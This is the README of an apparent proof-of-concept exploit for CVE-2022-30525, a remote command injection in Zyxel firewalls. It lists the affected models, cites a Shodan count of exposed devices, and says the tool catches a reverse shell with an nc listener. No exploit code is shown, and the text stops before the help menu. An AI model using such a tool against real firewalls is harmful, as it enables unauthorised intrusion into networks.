# Victorian Machinery

Victorian Machinery is a proof of concept exploit for CVE-2022-30525. The vulnerability is an unauthenticated and remote command injection vulnerability affecting Zyxel firewall's that support zero touch provisioning. Zyxel pushed a fix for this issue on April 28, 2022. The following models are known to be affected:

* USG FLEX 100, 100W, 200, 500, 700
* ATP 100, 200, 500, 700, 800
* USG20-VPN and USG20w-VPN

At the time of writing, there were more than [16,000](https://www.shodan.io/search?query=title%3A%22USG+FLEX+100%22%2C%22USG+FLEX+100w%22%2C%22USG+FLEX+200%22%2C%22USG+FLEX+500%22%2C%22USG+FLEX+700%22%2C%22USG+FLEX+50%22%2C%22USG+FLEX+50w%22%2C%22ATP100%22%2C%22ATP200%22%2C%22ATP500%22%2C%22ATP700%22) affected devices visible on Shodan. Exposing the management web interface *is not* the default setting, which implies there are many more affected systems not exposed to the internet. These systems also support automatic update (not enabled by default) so a good subset are already patched against this issue.

## Options

Victorian Machinery expliots the target and catches a reverse shell using a forked `nc` listener. This was tested on Ubuntu 20.04. The PoC tries to execute `/usr/bin/nc` by default. If your `nc` is somewhere else than you'll need to update the `nc-path` option. See the complete help menu below:
